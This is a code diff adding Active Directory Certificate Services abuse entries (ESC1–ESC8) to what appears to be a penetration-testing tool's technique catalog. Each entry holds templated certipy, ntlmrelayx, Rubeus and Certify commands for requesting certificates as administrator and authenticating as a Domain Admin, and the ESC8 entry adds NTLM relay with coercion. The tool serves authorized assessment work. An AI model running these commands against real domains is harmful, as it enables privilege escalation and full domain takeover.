@@ -162,6 +162,115 @@ _CATALOG: dict[str, AbuseSpec] = {
         destructive=True,
         win_template="Whisker.exe add /target:'{target_sam}'",
     ),
+    # --- AD CS ESC1-8 --------------------------------------------------------- #
+    # Each mirrors AddKeyCredentialLink (certipy shadow) above: a certipy `req` to obtain a cert
+    # as a privileged principal, then certipy `auth` to turn that cert into an NT hash / TGT. The
+    # native Windows variant is Certify.exe (the CRTP way). All are destructive — they issue a
+    # real certificate or reconfigure the PKI — and every command trips the danger heuristic
+    # (certipy subcommands / ntlmrelayx / Certify request / Rubeus asktgt), asserted by the oracle.
+    "ESC1": AbuseSpec(
+        title="AD CS ESC1 — enrollee-supplied SAN",
+        summary="Template {template} lets the enrollee set the SAN — request a cert as "
+                "administrator, then authenticate as a Domain Admin.",
+        tool="certipy",
+        kb_seeds="AD CS ESC1 certipy enrollee supplies subject SAN client authentication "
+                 "certificate template abuse domain escalation",
+        template=("certipy req -u '{enrollee}@{domain}' -p '<PASSWORD>' -dc-ip {dc} "
+                  "-ca '{ca}' -template '{template}' -upn 'administrator@{domain}'\n"
+                  "certipy auth -pfx administrator.pfx -dc-ip {dc}"),
+        needs_target="domain",
+        destructive=True,
+        win_template="Certify.exe request /ca:{ca} /template:{template} /altname:administrator",
+    ),
+    "ESC6": AbuseSpec(
+        title="AD CS ESC6 — CA EDITF_ATTRIBUTESUBJECTALTNAME2",
+        summary="CA {ca} honours a request-supplied SAN on ANY template — enrol any client-auth "
+                "template as administrator (ESC1 without a vulnerable template).",
+        tool="certipy",
+        kb_seeds="AD CS ESC6 certipy EDITF_ATTRIBUTESUBJECTALTNAME2 CA SAN any template "
+                 "certificate authority flag escalation",
+        template=("certipy req -u '{enrollee}@{domain}' -p '<PASSWORD>' -dc-ip {dc} "
+                  "-ca '{ca}' -template User -upn 'administrator@{domain}'\n"
+                  "certipy auth -pfx administrator.pfx -dc-ip {dc}"),
+        needs_target="domain",
+        destructive=True,
+        win_template="Certify.exe request /ca:{ca} /template:User /altname:administrator",
+    ),
+    "ESC8": AbuseSpec(
+        title="AD CS ESC8 — NTLM relay to web enrollment",
+        summary="CA {ca} exposes web enrollment (certsrv) — coerce a machine and relay its NTLM "
+                "auth to obtain a cert for that account, then authenticate with it.",
+        tool="ntlmrelayx / certipy",
+        kb_seeds="AD CS ESC8 ntlmrelayx adcs relay web enrollment certsrv petitpotam coerce "
+                 "certificate machine account",
+        template=("ntlmrelayx.py -t http://{dc}/certsrv/certfnsh.asp -smb2support --adcs "
+                  "--template 'DomainController'\n"
+                  "# + coerce the target (PetitPotam / printerbug), then: "
+                  "certipy auth -pfx relayed.pfx -dc-ip {dc}"),
+        needs_target="computer",
+        destructive=True,
+        win_template="Rubeus.exe asktgt /user:'{ca}$' /certificate:relayed.pfx /ptt",
+    ),
+    "ESC2": AbuseSpec(
+        title="AD CS ESC2 — Any Purpose (or no) EKU",
+        summary="Template {template} has an Any-Purpose EKU — the issued cert can be used for "
+                "client auth (and more); enrol it and authenticate.",
+        tool="certipy",
+        kb_seeds="AD CS ESC2 certipy any purpose EKU subordinate CA certificate template abuse",
+        template=("certipy req -u '{enrollee}@{domain}' -p '<PASSWORD>' -dc-ip {dc} "
+                  "-ca '{ca}' -template '{template}'\n"
+                  "certipy auth -pfx {enrollee}.pfx -dc-ip {dc}"),
+        needs_target="domain",
+        destructive=True,
+        win_template="Certify.exe request /ca:{ca} /template:{template}",
+    ),
+    "ESC3": AbuseSpec(
+        title="AD CS ESC3 — Enrollment Agent",
+        summary="Template {template} is a Certificate Request Agent template — enrol an agent "
+                "cert, then request a cert on behalf of a Domain Admin.",
+        tool="certipy",
+        kb_seeds="AD CS ESC3 certipy enrollment agent certificate request agent on behalf of "
+                 "template escalation",
+        template=("certipy req -u '{enrollee}@{domain}' -p '<PASSWORD>' -dc-ip {dc} "
+                  "-ca '{ca}' -template '{template}'\n"
+                  "certipy req -u '{enrollee}@{domain}' -p '<PASSWORD>' -dc-ip {dc} -ca '{ca}' "
+                  "-template User -on-behalf-of '{domain}\\administrator' -pfx agent.pfx"),
+        needs_target="domain",
+        destructive=True,
+        win_template=("Certify.exe request /ca:{ca} /template:{template} "
+                      "/onbehalfof:{domain}\\administrator /enrollcert:agent.pfx"),
+    ),
+    "ESC4": AbuseSpec(
+        title="AD CS ESC4 — write control over the template",
+        summary="You can rewrite template {template}'s configuration — make it ESC1-vulnerable "
+                "(enrollee-supplied SAN + client auth), then abuse it.",
+        tool="certipy",
+        kb_seeds="AD CS ESC4 certipy template write GenericAll WriteDacl reconfigure "
+                 "enrollee supplies subject vulnerable",
+        template=("certipy template -u '{enrollee}@{domain}' -p '<PASSWORD>' -dc-ip {dc} "
+                  "-template '{template}' -write-default-configuration\n"
+                  "# then abuse it as ESC1:\n"
+                  "certipy req -u '{enrollee}@{domain}' -p '<PASSWORD>' -dc-ip {dc} -ca '{ca}' "
+                  "-template '{template}' -upn 'administrator@{domain}'"),
+        needs_target="any",
+        destructive=True,
+        win_template="Certify.exe request /ca:{ca} /template:{template} /altname:administrator",
+    ),
+    "ESC7": AbuseSpec(
+        title="AD CS ESC7 — ManageCA / ManageCertificates",
+        summary="You hold ManageCA on {ca} — add yourself as an officer, enable a SAN-abusable "
+                "template (SubCA), and issue a cert as administrator.",
+        tool="certipy",
+        kb_seeds="AD CS ESC7 certipy ManageCA ManageCertificates add officer enable template "
+                 "SubCA approve request certificate authority",
+        template=("certipy ca -u '{enrollee}@{domain}' -p '<PASSWORD>' -dc-ip {dc} -ca '{ca}' "
+                  "-add-officer '{enrollee}'\n"
+                  "certipy ca -u '{enrollee}@{domain}' -p '<PASSWORD>' -dc-ip {dc} -ca '{ca}' "
+                  "-enable-template SubCA"),
+        needs_target="any",
+        destructive=True,
+        win_template="Certify.exe request /ca:{ca} /template:SubCA /altname:administrator",
+    ),
     "AddAllowedToAct": AbuseSpec(
         title="Resource-based constrained delegation (write)",
         summary="Write msDS-AllowedToActOnBehalfOfOtherIdentity on {target} for RBCD takeover.",
@@ -374,6 +483,15 @@ def technique_for_edge(
         "domain": str(domain),
         "dc": dc or _guess_dc(graph) or "<DC>",
         "target_spn": (eprops.get("spn") or f"cifs/{_sam(tnode.label) if tnode else target}"),
+        # AD CS (ESC) context, carried on the synthesized edge's props (parser._ingest_certipy):
+        # which CA + template the abuse targets, the EKU, and the ENROLLEE (which on a two-hop
+        # ESC4/ESC7 chain is the human, not the intermediate template/CA node that is the edge
+        # source). Absent props degrade to explicit placeholders, never a stray "{ca}".
+        "ca": str(eprops.get("ca_name") or eprops.get("ca") or "<CA>"),
+        "template": str(eprops.get("template_name") or eprops.get("template") or "<TEMPLATE>"),
+        "eku": str(eprops.get("eku") or "Client Authentication"),
+        "enrollee": str(eprops.get("enrollee_sam") or _sam(snode.label if snode else source)
+                        or "<USER>"),
     }
 
     summary = _fill(spec.summary, ctx)
